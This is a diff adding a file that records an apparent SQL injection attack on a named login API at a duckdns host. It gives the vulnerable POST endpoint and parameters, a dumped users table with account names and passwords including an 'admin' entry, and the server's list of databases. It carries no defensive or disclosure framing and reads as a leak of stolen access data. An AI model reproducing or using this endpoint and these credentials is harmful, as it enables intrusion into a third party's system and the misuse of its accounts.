@@ -1,0 +1,22 @@
+VULN URL : POST : http://titrepro.duckdns.org/api/login/api.php DATA : key=0&keyad=e
+
+Database: shivaschecker
+Table: users
+[2 entries]
++----+---------+---------+--------+---------+
+| id | key_ad  | key_pas | endkey | enddate |
++----+---------+---------+--------+---------+
+| 1  | lewarey | admin   | 0      | 0       |
+| 41 | atelius | atelius | 0      | 0       |
++----+---------+---------+--------+---------+
+
+available databases [9]:
+[*] `101m`
+[*] `116m`
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] phpmyadmin
+[*] secmen
+[*] shivaschecker
+[*] test
